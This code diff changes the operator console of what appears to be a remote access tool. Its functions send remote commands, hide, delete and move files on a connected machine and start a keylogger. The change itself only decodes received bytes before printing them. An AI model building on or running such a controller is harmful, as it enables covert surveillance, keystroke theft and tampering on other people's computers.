@@ -54,8 +54,10 @@ def execute(conn):
     SocketManager.send_data(conn, exe_command)
 
     data = SocketManager.receive(conn)
-
-    print(data)  # TODO handle /n
+    if isinstance(data, bytes):
+        print(data.decode())
+    else:
+        print(data)
 
 
 def change_ip(conn):
@@ -88,7 +90,10 @@ def file_system_info(conn):
     file_info_dir = input("Please enter the directory you want to check\n")
     SocketManager.send_data(conn, file_info_dir)
     data = SocketManager.receive(conn)
-    print(data)
+    if isinstance(data, bytes):
+        print(data.decode())
+    else:
+        print(data)
 
 
 def show_hidden_file(conn):
@@ -97,7 +102,10 @@ def show_hidden_file(conn):
     hidden_file_path = input("Please enter the hidden file path\n")
     SocketManager.send_data(conn, hidden_file_path)
     data = SocketManager.receive(conn)
-    print(data)
+    if isinstance(data, bytes):
+        print(data.decode())
+    else:
+        print(data)
 
 
 def hide_file(conn):
@@ -106,7 +114,10 @@ def hide_file(conn):
     file_path_to_hide = input("Please enter the file path to hide\n")
     SocketManager.send_data(conn, file_path_to_hide)
     data = SocketManager.receive(conn)
-    print(data)
+    if isinstance(data, bytes):
+        print(data.decode())
+    else:
+        print(data)
 
 
 def delete_file(conn):
@@ -115,7 +126,10 @@ def delete_file(conn):
     file_to_delete = input("Please enter the file path to delete\n")
     SocketManager.send_data(conn, file_to_delete)
     data = SocketManager.receive(conn)
-    print(data)
+    if isinstance(data, bytes):
+        print(data.decode())
+    else:
+        print(data)
 
 
 def move_file(conn):
@@ -126,7 +140,10 @@ def move_file(conn):
     dir_to_move = input("Please enter the directory to move to\n")
     SocketManager.send_data(conn, dir_to_move)
     data = SocketManager.receive(conn)
-    print(data)
+    if isinstance(data, bytes):
+        print(data.decode())
+    else:
+        print(data)
 
 
 def start_key_logger(conn, is_running_key_logger):
